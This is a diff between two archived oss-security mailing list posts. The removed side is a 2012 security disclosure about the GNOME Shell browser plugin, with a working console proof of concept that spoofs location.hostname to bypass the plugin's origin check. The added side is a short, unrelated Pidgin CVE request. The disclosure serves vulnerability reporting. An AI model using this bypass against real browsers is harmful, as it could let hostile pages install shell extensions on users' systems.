@@ -1,97 +1,18 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/09/08/1
-Message-ID: <mpro.ma1ysf01zd0kg050u.taviso@cmpxchg8b.com>
-Date: Sun, 9 Sep 2012 00:36:26 +0200
-From: Tavis Ormandy <taviso@...xchg8b.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/05/07/1
+Message-ID: <CAPZ8mV5bBPnBPgD4yPdvpc=sMt3=icVF_zNLzrPPY+uN9q_9TQ@mail.gmail.com>
+Date: Sun, 6 May 2012 22:40:12 -0700
+From: Mark Doliner <mark@...gant.net>
 To: oss-security@...ts.openwall.com
-Subject: note on gnome shell extensions
+Subject: CVE request: A Pidgin remote crash
 Content-Type: text/plain; charset=utf-8
 
-List, I just installed Fedora 17 on a workstation. While researching how to
-upgrade gnome 3 to version 2, I noticed it installed a browser extension
-called "Gnome Shell Integration".
+Could I request that a CVE be issued for a possible
+remotely-triggerable crash in Pidgin?  To my knowledge no CVE exists
+for this issue.  The issue is described at
+http://pidgin.im/news/security/?id=63
 
-$ rpm -qf /usr/lib64/mozilla/plugins/libgnome-shell-browser-plugin.so
-gnome-shell-3.4.1-5.fc17.x86_64
+The Pidgin project has just released version 2.10.4 which fixes the issue.
 
-The NPPVpluginDescriptionString states "It can be used only by
-extensions.gnome.org", but I happen to know that is a tricky thing to get
-right.
-
-102   if (!funcs.getproperty (instance, NPVARIANT_TO_OBJECT (document),
-103                           funcs.getstringidentifier ("location"),
-104                           &location))
-105     goto out;
-106 
-107   if (!NPVARIANT_IS_OBJECT (location))
-108     goto out;
-109 
-110   hostname = get_string_property (instance,
-111                                   NPVARIANT_TO_OBJECT (location),
-112                                   "hostname");
-113 
-114   if (g_strcmp0 (hostname, ORIGIN))
-115     {
-116       g_debug ("origin does not match, is %s",
-117                hostname);
-118 
-119       goto out;
-120     }
-
-I'm familiar with this topic as I wrote a tool for managing broken but
-necessary plugins by restricting them to trusted domains.
-
-http://code.google.com/p/nssecurity
-
-As far as I know, browsers only attempt to prevent tampering with
-document.location.href, anything else can be modified. For example, this
-works in Chrome, I don't know the syntax for Mozilla:
-
-> location.__defineGetter__("hostname", function () { return "arbitrary"; })
-  undefined
-> location.hostname
-  "arbitrary"
-
-However,  
-
-> location.__defineGetter__("href", function () { return "arbitrary"; })
-  undefined
-> location.href
-  "http://realurl.test/asdasd"
-
-So this should fail:
-
-> o = document.createElement('OBJECT')
-  <object>?</object>?
-> o.setAttribute('TYPE', 'application/x-gnome-shell-integration')
-  undefined
-> document.body.appendChild(o)
-  <object type=?"application/?x-gnome-shell-integration">?</object>?
-> o.shellVersion
-  undefined
-
-But we can re-insert it and make it work:
-
-> document.body.removeChild(o)
-  <object type=?"application/?x-gnome-shell-integration">?</object>?
-> location.__defineGetter__("hostname", function () { return
-"extensions.gnome.org"; })
-  undefined
-> document.body.appendChild(o)
-  <object type=?"application/?x-gnome-shell-integration">?</object>?
-> o.shellVersion
-  "3.4.1"
-> document.location.href
-  "https://www.redhat.com/"
-
-The plugin incorrectly trusted hostname, and initialized. As far as I can
-tell, the plugin will let you install new shell extensions, I don't know
-what the impact of that is, can they contain native code?
-
-Tavis.
-
--- 
--------------------------------------
-taviso@...xchg8b.com | pgp encrypted mail preferred
--------------------------------------------------------
-
+Thanks,
+Mark
